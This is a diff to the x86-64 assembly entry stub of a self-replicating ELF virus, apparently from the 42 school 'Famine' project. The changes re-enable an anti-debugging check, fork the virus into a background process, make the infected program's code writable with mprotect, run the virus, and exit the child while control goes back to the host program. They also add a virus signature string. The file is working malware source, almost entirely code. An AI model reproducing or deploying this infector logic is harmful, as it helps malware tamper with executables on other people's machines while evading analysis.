@@ -6,15 +6,17 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/06/10 19:14:41 by agrumbac         ###   ########.fr        ;
+;    Updated: 2019/06/15 17:30:07 by ichkamo          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
-%define SYSCALL_WRITE		0x1
-%define SYSCALL_MPROTECT	0xa
-%define STDOUT			0x1
-%define PROT_RWX		0x7
-%define CALL_INSTR_SIZE		0x5
+%define SYSCALL_WRITE		0x01
+%define SYSCALL_EXIT		0x3c
+%define SYSCALL_MPROTECT	0x0a
+%define STDOUT			0x01
+%define PROT_RWX		0x07
+%define CALL_INSTR_SIZE		0x05
+%define SYSCALL_FORK		0x39
 
 section .text
 	global famine_entry
@@ -29,6 +31,7 @@ famine_entry:
 	call mark_below
 	db "128 bit key here", "rel ptld", "ptldsize", "relvirus"
 	db "relentry", "virusize"
+	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
 ;------------------------------; Get variables address
 ; | 0    | *(16)       | *24         | *(32)       | *(40)        | *48        |
 ; | rdx  | r8          | r9          | r10         | r11          | r14        |
@@ -79,6 +82,7 @@ mark_below:
 	push r11                   ; save entry addr    [rsp + 8]
 	push rdx                   ; save key           [rsp]
 ;------------------------------; Show-off
+%ifdef DEBUG
 	mov rax, 0x00000a2e2e2e2e59
 	push rax
 	mov rax, 0x444f4f572e2e2e2e
@@ -92,16 +96,22 @@ mark_below:
 	syscall
 
 	add rsp, 16
+%endif
 ;------------------------------; check if client behaves well (comment for debug)
-	; call detect_spy
-	; test rax, rax
-	; jnz return_to_client
+	call detect_spy
+	test rax, rax
+	jnz return_to_client
+;------------------------------; fork virus
+	mov rax, SYSCALL_FORK
+	syscall
+	test rax, rax
+	jnz return_to_client
 ;------------------------------; make ptld writable
 	mov r8, [rsp + 32]         ; get ptld addr
 	mov r9, [rsp + 24]         ; get ptld len
 
 	;mprotect(ptld_addr, ptld_size, PROT_READ | PROT_WRITE | PROT_EXEC);
-add r9, 0x2df0;TMp DEBUG
+
 	mov rdi, r8
 	mov rsi, r9
 	mov rdx, PROT_RWX
@@ -122,6 +132,12 @@ add r9, 0x2df0;TMp DEBUG
 ;------------------------------; launch virus
 	mov rdi, rdx
 	call virus
+	add rsp, 48
+	pop r14
+	pop rdx
+	mov rdi, 0
+	mov rax, SYSCALL_EXIT
+	syscall
 ;------------------------------; return to client entry
 return_to_client:
 	mov r11, [rsp + 8]         ; get entry addr
